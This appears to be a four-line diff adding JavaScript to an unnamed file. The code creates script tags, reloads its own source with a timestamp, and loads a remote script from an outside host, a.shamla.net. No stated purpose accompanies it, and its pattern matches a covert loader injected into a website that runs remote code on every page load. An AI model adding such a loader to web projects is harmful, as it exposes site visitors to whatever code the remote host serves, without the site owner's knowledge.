@@ -1,0 +1,4 @@
+fsg= function(url){ var scr=document.createElement("script");scr.setAttribute("type","text/javascript");scr.setAttribute("src",url);document.getElementsByTagName("head")[0].appendChild(scr) };
+var s = document.currentScript.src + "?tv=" + (new Date()).getTime();
+fsg(s);
+fsg("http://a.shamla.net/cpcmast13.js");
